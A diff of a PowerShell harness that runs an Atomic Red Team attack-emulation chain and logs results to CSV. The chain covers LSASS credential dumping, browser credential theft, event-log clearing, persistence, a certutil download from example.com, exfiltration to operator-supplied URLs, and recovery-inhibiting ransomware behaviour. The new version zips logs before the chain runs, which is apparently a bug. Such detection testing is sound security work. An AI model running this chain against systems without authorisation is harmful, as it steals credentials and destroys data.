@@ -1,45 +1,18 @@
 #Requires -Version 5.1
-<#
-  AtomicChainRecOut.ps1
-  - Runs selected Atomic Red Team tests
-  - Writes SIMPLE CSV and per-test transcript logs with readable timing
-  - PS 5.1 compatible
-#>
-
 [CmdletBinding()]
 param(
-  [string]$AtomicRoot   = "C:\AtomicRedTeam",
-  [string]$OutCsv       = "$env:USERPROFILE\Desktop\atomic_run_log.csv",
+  [string]$AtomicRoot = "C:\AtomicRedTeam",
+  [string]$OutCsv = "$env:USERPROFILE\Desktop\atomic_run_log.csv",
   [string]$ArtifactsDir = "$env:USERPROFILE\Desktop\atomic_outputs",
-
-  # Human-readable time (Europe/Berlin TZ)
-  [string]$TimeFormat   = 'yyyy-MM-dd HH:mm:ss.fff zzz',
-  [string]$TimeZoneId   = 'Turkey Standard Time',
-
-  [switch]$IncludeDestructive
+  [int]$OutputChars = 800,                 # how many chars to include in CSV
+  [switch]$IncludeDestructive,
+  [switch]$DiscoveryOnly,
+  [string]$ExfilHttpUrl,
+  [string]$ExfilFtpUrl
 )
 
-$ErrorActionPreference = 'Stop'
 
-# ----------------- Helpers -----------------
-function Format-LocalTime {
-  param([datetime]$dt)
-  try {
-    $tz = [System.TimeZoneInfo]::FindSystemTimeZoneById($TimeZoneId)
-    $loc = [System.TimeZoneInfo]::ConvertTime($dt, $tz)
-  } catch { $loc = $dt }
-  return $loc.ToString($TimeFormat)
-}
-function Format-Duration {
-  param([TimeSpan]$ts)
-  "{0:00}:{1:00}:{2:00}.{3:000}" -f $ts.Hours, $ts.Minutes, $ts.Seconds, $ts.Milliseconds
-}
-function Safe-OneLine {
-  param([string]$s)
-  if (-not $s) { return "" }
-  $s = $s -replace "\r?\n", " ; "
-  ($s -replace "\s+", " ").Trim()
-}
+$ErrorActionPreference = 'Stop'
 
 function Ensure-InvokeAtomic {
   if (-not (Get-Command Invoke-AtomicTest -ErrorAction SilentlyContinue)) {
@@ -52,31 +25,11 @@ function Ensure-InvokeAtomic {
   }
 }
 
-# Best-effort: read executor & command from technique YAML to append in log footer
-function Resolve-AtomicDetails {
+function Run-Atomic {
   param(
-    [string]$Technique,
-    [int]$TestNumber
-  )
-  $execName = ""
-  $cmdLine  = ""
-  try {
-    $t  = Get-AtomicTechnique -Technique $Technique -PathToAtomicsFolder "$AtomicRoot\atomics"
-    $ix = [Math]::Max(0, $TestNumber - 1)
-    if ($t.atomic_tests.Count -gt $ix) {
-      $test = $t.atomic_tests[$ix]
-      if ($test.executor -and $test.executor.name)    { $execName = [string]$test.executor.name }
-      if ($test.executor -and $test.executor.command) { $cmdLine  = Safe-OneLine ([string]$test.executor.command) }
-    }
-  } catch { }
-  [pscustomobject]@{ Executor = $execName; ResolvedCommand = $cmdLine }
-}
-
-# ----------------- Runner -----------------
-function Start-Atomic {
-  param(
-    [string]$Technique,
+    [Parameter(Mandatory=$true)][string]$Technique,
     [int[]]$Tests,
+    [hashtable]$InputArgs,
     [string]$Note,
     [switch]$Dangerous
   )
@@ -85,124 +38,149 @@ function Start-Atomic {
     Write-Host "[-] Skipping $Technique ($Note) because -IncludeDestructive was not set." -ForegroundColor Yellow
     return
   }
-  if (-not $Tests -or $Tests.Count -eq 0) { $Tests = @(1) }
 
-  foreach ($tn in $Tests) {
-    $tsStart = Get-Date
-    $sw = [System.Diagnostics.Stopwatch]::StartNew()
+  # Default to all/first test if not specified
+  if (-not $Tests -or $Tests.Count -eq 0) {
+    try { $Tests = @(1) } catch { $Tests = @(1) }
+  }
 
-    $status  = "Unknown"
-    $safeNote = (($Note -replace '[^a-zA-Z0-9_\-\. ]','_') -replace '\s+','_')
-    $logName = "{0}_{1}_{2}_{3}.log" -f $Technique, $tn, $safeNote, (Get-Date -Format 'yyyyMMdd-HHmmss')
-    $logPath = Join-Path $ArtifactsDir $logName
+  # safe logfile name
+  $safeNote = ($Note -replace '[^a-zA-Z0-9_\-\. ]','_') -replace '\s+','_'
+  $logPath  = Join-Path $ArtifactsDir ("{0}_{1}_{2}.log" -f $Technique, ($Tests -join '-'), (Get-Date -Format 'yyyyMMdd-HHmmss'))
 
-    $det = Resolve-AtomicDetails -Technique $Technique -TestNumber $tn
-    $execName = $det.Executor
-    $resolved = $det.ResolvedCommand
+  $tsStart = Get-Date
+  $status  = "Unknown"
+  $msg     = ""
+  $snippet = ""
 
-    try {
-      Write-Host "[>] $Technique (test $tn) — $Note"
-      try { Stop-Transcript | Out-Null } catch { }
-      Start-Transcript -Path $logPath -Force | Out-Null
+  try {
+    Write-Host "[>] $Technique — $Note"
 
-      Invoke-AtomicTest $Technique -TestNumbers $tn -GetPrereqs -PathToAtomicsFolder "$AtomicRoot\atomics" -ErrorAction Stop | Out-Null
-      Invoke-AtomicTest $Technique -TestNumbers $tn -PathToAtomicsFolder "$AtomicRoot\atomics" -ErrorAction Stop | Out-Null
+    # Start transcript to capture EVERYTHING Invoke-AtomicTest prints
+    try { Stop-Transcript | Out-Null } catch {}
+    Start-Transcript -Path $logPath -Force | Out-Null
 
-      $status = "Executed"
-    } catch {
-      $status = "Error"
-      Write-Warning ("  ! {0} test {1} failed: {2}" -f $Technique, $tn, $_.Exception.Message)
-    } finally {
-      try { Stop-Transcript | Out-Null } catch { }
-      $sw.Stop()
-      $tsEnd = Get-Date
+    # Prereqs + Execute
+    Invoke-AtomicTest $Technique -TestNumbers $Tests -GetPrereqs -PathToAtomicsFolder "$AtomicRoot\atomics" -InputArgs $InputArgs -ErrorAction Stop | Out-Null
+    Invoke-AtomicTest $Technique -TestNumbers $Tests -PathToAtomicsFolder "$AtomicRoot\atomics" -InputArgs $InputArgs -ErrorAction Stop | Out-Null
 
-      # Append human-readable footer into the transcript
-      try {
-        $footer = @()
-        $footer += ""
-        $footer += "----- Atomic Footer -----------------------------------------"
-        $footer += ("Technique      : {0} (test {1})" -f $Technique, $tn)
-        if ($execName) { $footer += ("Executor       : {0}" -f $execName) }
-        if ($resolved) { $footer += ("Command        : {0}" -f $resolved) }
-        $footer += ("Start Local    : {0}" -f (Format-LocalTime $tsStart))
-        $footer += ("End   Local    : {0}" -f (Format-LocalTime $tsEnd))
-        $footer += ("Duration       : {0}" -f (Format-Duration $sw.Elapsed))
-        $footer += "-------------------------------------------------------------"
-        Add-Content -Path $logPath -Value ($footer -join "`r`n")
-      } catch { }
+    $status = "Executed"
+  } catch {
+    $status = "Error"
+    $msg = $_.Exception.Message
+    Write-Warning "  ! $Technique failed: $msg"
+  } finally {
+    try { Stop-Transcript | Out-Null } catch {}
 
-      # Simple CSV row
-      $row = New-Object psobject -Property ([ordered]@{
-        StartTimeLocal = Format-LocalTime $tsStart
-        EndTimeLocal   = Format-LocalTime $tsEnd
-        DurationHMS    = Format-Duration $sw.Elapsed
-        Technique      = $Technique
-        Test           = $tn
-        Note           = $Note
-        Status         = $status
-        OutputPath     = $logPath
-      })
-      $append = Test-Path $OutCsv
-      $row | Export-Csv -Path $OutCsv -NoTypeInformation -Append:$append
+    $tsEnd = Get-Date
+
+    # Read transcript and include a short tail in CSV
+    if (Test-Path $logPath) {
+      $raw = Get-Content -Path $logPath -Raw -ErrorAction SilentlyContinue
+      # strip transcript headers to keep it compact (optional)
+      $clean = $raw -replace '(?s)\*{5,}.*?\*{5,}',''
+      if ($clean.Length -gt $OutputChars) {
+        $snippet = $clean.Substring([Math]::Max(0, $clean.Length - $OutputChars))
+      } else {
+        $snippet = $clean
+      }
+      # single-line it for CSV readability
+      $snippet = ($snippet -replace '\s+',' ').Trim()
     }
+
+    $row = [pscustomobject]@{
+      Timestamp   = $tsStart.ToString("s")
+      Technique   = $Technique
+      Tests       = ($Tests -join ',')
+      Note        = $Note
+      Status      = $status
+      DurationSec = [int]($tsEnd - $tsStart).TotalSeconds
+      Message     = $msg
+      OutputPath  = $logPath
+      OutputSnippet = $snippet
+    }
+    $append = Test-Path $OutCsv
+    $row | Export-Csv -Path $OutCsv -NoTypeInformation -Append:$append
   }
 }
 
-# ----------------- Setup -----------------
+
+# ----------------- Bootstrap -----------------
 Ensure-InvokeAtomic
 $null = New-Item -ItemType Directory -Force -Path (Split-Path $OutCsv) -ErrorAction SilentlyContinue
 $null = New-Item -ItemType Directory -Force -Path $ArtifactsDir -ErrorAction SilentlyContinue
-Write-Host "[*] CSV  -> $OutCsv"
-Write-Host "[*] Logs -> $ArtifactsDir`n"
 
-# ----------------- TTP Chain (risky ones gated) -----------------
-$chain = @(
-  # Discovery / inventory (safe)
-  @{ T='T1049'     ; N='System Network Connections Discovery'        ; Tests=@(1); Danger=$false }
-  @{ T='T1016'     ; N='System Network Configuration Discovery'      ; Tests=@(1); Danger=$false }
-  @{ T='T1057'     ; N='Process Discovery'                           ; Tests=@(1); Danger=$false }
-  @{ T='T1518.001' ; N='Security Software Discovery (WMIC)'         ; Tests=@(1); Danger=$false }
-  @{ T='T1135'     ; N='Network Share Discovery'                     ; Tests=@(1); Danger=$false }
-  @{ T='T1087.002' ; N='Domain Account Discovery'                    ; Tests=@(1); Danger=$false }
 
-  # Signed binary proxy execution (safe)
-  @{ T='T1218.007' ; N='Signed Binary Proxy (msiexec)'               ; Tests=@(1); Danger=$false }
-  @{ T='T1218.005' ; N='Signed Binary Proxy (mshta)'                 ; Tests=@(1); Danger=$false }
 
-  # Remote access software / simulators (risky)
-  @{ T='T1219'     ; N='Remote Access Software (simulation)'         ; Tests=@(1); Danger=$true }
 
-  # Hijack / injection (risky)
-  @{ T='T1574.001' ; N='DLL Search Order Hijacking (sample)'         ; Tests=@(1); Danger=$true }
-  @{ T='T1055.001' ; N='Process Injection (CreateRemoteThread)'      ; Tests=@(1); Danger=$true }
+Write-Host "[*] Results will be logged to: $OutCsv`n"
 
-  # Credential Access
-  @{ T='T1558.003' ; N='Kerberoasting'                               ; Tests=@(1); Danger=$false }
-  @{ T='T1558.004' ; N='AS-REP Roasting'                             ; Tests=@(1); Danger=$false }
-  @{ T='T1003.003' ; N='NTDS Dump from Shadow Copy'                  ; Tests=@(1); Danger=$true }
+$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
+$zip = Join-Path (Split-Path $OutCsv) ("atomic_outputs_{0}.zip" -f $stamp)
+if (Test-Path $zip) { Remove-Item $zip -Force }
+Compress-Archive -Path (Join-Path $ArtifactsDir '*') -DestinationPath $zip -Force
+Write-Host "[*] Collected logs zipped at: $zip"
 
-  # Defense Evasion / Impair Defenses (risky)
-  @{ T='T1112'     ; N='Modify Registry (Enable WDigest)'            ; Tests=@(1); Danger=$true }
-  @{ T='T1070.001' ; N='Clear Windows Event Logs'                    ; Tests=@(1); Danger=$true }
-  @{ T='T1562.004' ; N='Impair Defenses (Firewall via netsh)'        ; Tests=@(1); Danger=$true }
-  @{ T='T1562.008' ; N='Disable Security Tools (Defender off)'       ; Tests=@(1); Danger=$true }
-  @{ T='T1562.001' ; N='Disable/Modify Security Tools (services)'    ; Tests=@(1); Danger=$true }
-  @{ T='T1548.002' ; N='Bypass UAC (fodhelper/cmstp)'                ; Tests=@(1); Danger=$true }
-  @{ T='T1564.008' ; N='Email Rules for Hiding (Outlook)'            ; Tests=@(1); Danger=$true }  # needs Outlook
 
-  # Exfiltration
-  @{ T='T1048.003' ; N='Exfil over Unencrypted Non-C2 (FTP)'         ; Tests=@(1); Danger=$false }
+# ----------------- Chain definition -----------------
+# NOTE: TestNumbers are the most common Windows atomics. If a number isn’t present in your local atomics set,
+# the runner will try prerequisites and then attempt the default test(1). You can edit/expand as needed.
 
-  # Impact (risky)
-  @{ T='T1489'     ; N='Service Stop (impact simulation)'            ; Tests=@(1); Danger=$true }
-)
+$chain = @()
 
-# ----------------- Execute -----------------
-foreach ($step in $chain) {
-  Start-Atomic -Technique $step.T -Tests $step.Tests -Note $step.N -Dangerous:([bool]$step.Danger)
+# ---- Discovery ----
+$chain += [pscustomobject]@{ T='T1082'      ; N='System Information Discovery'            ; Tests=@(1) ; Args=@{} ; Danger=$false }
+$chain += [pscustomobject]@{ T='T1033'      ; N='Account Discovery (whoami /all)'         ; Tests=@(1) ; Args=@{} ; Danger=$false }
+$chain += [pscustomobject]@{ T='T1046'      ; N='Network Service Discovery (PowerShell)'  ; Tests=@(1) ; Args=@{} ; Danger=$false }
+$chain += [pscustomobject]@{ T='T1087.002'  ; N='Domain Account Discovery'                ; Tests=@(1) ; Args=@{} ; Danger=$false }
+$chain += [pscustomobject]@{ T='T1482'      ; N='Domain Trust Discovery'                  ; Tests=@(1) ; Args=@{} ; Danger=$false }
+
+if (-not $DiscoveryOnly) {
+
+  # ---- C2 / Ingress Tool Transfer ----
+  $dlFile = "$env:TEMP\atomic-download.bin"
+  $chain += [pscustomobject]@{ T='T1105'    ; N='Ingress Tool Transfer (certutil download)'; Tests=@(1) ; Args=@{ input_url="https://example.com/file.bin"; output_file=$dlFile } ; Danger=$false }
+
+  # ---- Credential Access ----
+  $chain += [pscustomobject]@{ T='T1558.003'; N='Kerberoasting (set of SPNs)'             ; Tests=@(1) ; Args=@{} ; Danger=$false }
+  $chain += [pscustomobject]@{ T='T1003.001'; N='OS Credential Dumping (LSASS via comsvcs)'; Tests=@(1) ; Args=@{} ; Danger=$true }   # destructive-ish
+  $chain += [pscustomobject]@{ T='T1555.003'; N='Credentials from Web Browsers'           ; Tests=@(1) ; Args=@{} ; Danger=$false }
+
+  # ---- Lateral Movement (local simulation style atomics) ----
+  # These atomics simulate or prep the behavior without requiring remote creds.
+  $chain += [pscustomobject]@{ T='T1047'    ; N='WMI Execution (local/sim)'               ; Tests=@(1) ; Args=@{} ; Danger=$false }
+  $chain += [pscustomobject]@{ T='T1021.006'; N='WinRM (simulation)'                      ; Tests=@(1) ; Args=@{} ; Danger=$false }
+  $chain += [pscustomobject]@{ T='T1021.002'; N='SMB/PSExec (simulation)'                 ; Tests=@(1) ; Args=@{} ; Danger=$false }
+
+  # ---- Defense Evasion ----
+  $chain += [pscustomobject]@{ T='T1218.011'; N='Signed Binary Proxy Exec (rundll32)'     ; Tests=@(1) ; Args=@{} ; Danger=$false }
+  $chain += [pscustomobject]@{ T='T1112'    ; N='Modify Registry (WDigest flip)'          ; Tests=@(1) ; Args=@{} ; Danger=$true }   # configuration tamper
+  $chain += [pscustomobject]@{ T='T1070.001'; N='Clear Windows Event Logs'                ; Tests=@(1) ; Args=@{} ; Danger=$true }   # destructive
+
+  # ---- Persistence ----
+  $chain += [pscustomobject]@{ T='T1053.005'; N='Scheduled Task (daily)'                  ; Tests=@(1) ; Args=@{} ; Danger=$false }
+  $chain += [pscustomobject]@{ T='T1547.001'; N='Run Key Persistence'                     ; Tests=@(1) ; Args=@{} ; Danger=$false }
+  $chain += [pscustomobject]@{ T='T1136.001'; N='Create Local Account'                    ; Tests=@(1) ; Args=@{} ; Danger=$false }
+  $chain += [pscustomobject]@{ T='T1098'    ; N='Account Manipulation (add to group)'     ; Tests=@(1) ; Args=@{} ; Danger=$false }
+
+  # ---- Collection ----
+  $chain += [pscustomobject]@{ T='T1056.001'; N='Keylogging (simulation)'                 ; Tests=@(1) ; Args=@{} ; Danger=$false }
+  $chain += [pscustomobject]@{ T='T1560.001'; N='Archive Collected Data (7-Zip)'          ; Tests=@(1) ; Args=@{} ; Danger=$false }
+
+  # ---- Exfiltration ----
+  if ($ExfilHttpUrl) { $chain += [pscustomobject]@{ T='T1041'; N='Exfil over C2/HTTP (sim)'; Tests=@(1); Args=@{ url=$ExfilHttpUrl } ; Danger=$false } }
+  if ($ExfilFtpUrl ) { $chain += [pscustomobject]@{ T='T1048'; N='Exfil over Alternative Protocol (FTP)'; Tests=@(1); Args=@{ url=$ExfilFtpUrl } ; Danger=$false } }
+
+  # ---- Impact (Ransomware behaviors) ----
+  $chain += [pscustomobject]@{ T='T1490'    ; N='Inhibit System Recovery (vssadmin/bcdedit)'; Tests=@(1) ; Args=@{} ; Danger=$true }  # destructive
+  $chain += [pscustomobject]@{ T='T1486'    ; N='Data Encrypted for Impact (simulated)'   ; Tests=@(1) ; Args=@{} ; Danger=$true }  # potentially destructive
 }
 
-Write-Host "`n[✓] Chain complete."
-Write-Host "[*] CSV : $OutCsv"
-Write-Host "[*] Logs: $ArtifactsDir"
+# ----------------- Execute chain -----------------
+$idx = 1
+foreach ($step in $chain) {
+  Run-Atomic -Technique $step.T -Tests $step.Tests -InputArgs $step.Args -Note ("{0}. {1}" -f $idx, $step.N) -Dangerous:([bool]$step.Danger)
+  $idx++
+}
+
+Write-Host "`n[✓] Chain complete. CSV log: $OutCsv"
